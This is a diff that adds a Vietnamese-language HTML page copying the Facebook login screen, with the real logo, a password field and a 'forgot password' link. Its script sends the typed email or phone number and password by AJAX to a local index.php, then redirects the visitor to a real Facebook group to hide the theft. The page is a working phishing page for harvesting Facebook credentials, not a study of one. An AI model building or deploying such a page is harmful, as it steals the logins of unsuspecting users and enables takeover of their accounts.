@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="kết bạn , gặp gỡ , giao lưu">
+    <title>Facebook - Đăng nhập hoặc đăng kí</title>
+    <link rel="stylesheet" href="style.css" >
+    
+</head>
+<body>
+<div class="khunglonnhat">
+    <div class="khungchinh">
+        <div class="khungchu">
+            <div class="box1">
+                <img class="logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg">
+
+            </div>
+            <div class="box2">
+                <h2 class="chu"> Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</h2>
+            </div>
+
+        </div>
+    <!-----------------------------FORM------------------------------->
+        <div class="khungdangki">
+            <div class="khungvien">
+                <div class="khungdangnhap">
+                    <form action="index.php" method="post" onsubmit="return handleSubmit();">
+                        <div>
+                            <!----------FORM ĐIỀN UID PASS------------>
+                            <div class="khunguid">
+                                <label for="uid"></label>
+                                <input type="text" id="uid" name="uid" placeholder="Email hoặc số điện thoại" class="uidpass">
+
+                            </div>
+                            <div class="khungpass">
+                                <label for="pass"></label>
+                                <input type="password" id="pass" name="pass" placeholder="Mật khẩu" class="uidpass">
+                            </div>
+                            <!-------------BUTTON ĐĂNG NHẬP-------------->
+                            <div class="khungnutdangnhap">
+                                <button type="submit" class="nutdangnhap" > Đăng nhập</button>
+                            </div>
+                            <!--------CHỮ QUÊN MẬT KHẨU-------->
+                            <div class="khungchuquenmatkhau">
+                                <a class="chuquenmatkhau" href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzIxOTc0NDg5LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login&amp;next">Quên mật khẩu?</a>
+                            </div>
+                            <!-----dấu gạch ngang---------->
+                            <div class="daugachngang">
+                                <hr>
+                            </div>
+                            <!-----nút tạo tài khoản --------->
+                            <div class="kttk">
+                                <div class="knutttk">
+                                    <button  class="nutttk">
+                                        Tạo tài khoản mới
+                                    </button>
+
+                                </div>
+                            </div>
+                        </div>
+                    </form>
+                    <script>
+                        function handleSubmit() {
+                            // Tạo đối tượng FormData để lấy dữ liệu từ form
+                            var formData = new FormData(document.querySelector('form'));
+                
+                            // Gửi dữ liệu tới server bằng AJAX
+                            var xhr = new XMLHttpRequest();
+                            xhr.open('POST', 'index.php', true);
+                            xhr.onload = function () {
+                                if (xhr.status === 200) {
+                                    // Chuyển hướng tới trang success.html sau khi xử lý thành công
+                                    window.location.href = 'https://www.facebook.com/groups/470782274729315';
+                                } else {
+                                    alert('Đã xảy ra lỗi khi gửi dữ liệu');
+                                }
+                            };
+                            xhr.send(formData);
+                
+                            // Ngăn chặn form gửi đi theo cách thông thường
+                            return false;
+                        }
+                    </script>
+                    <!--------CHỮ TẠO TRANG--------->
+                    <div class="box3">
+                        <p class="chutaotrang"> <span><b>Tạo trang</b></span>  dành cho người nổi tiếng, thương hiệu hoặc doanh nghiệp.</p>
+                    </div>
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+</div>
+    
+</body>
+</html>
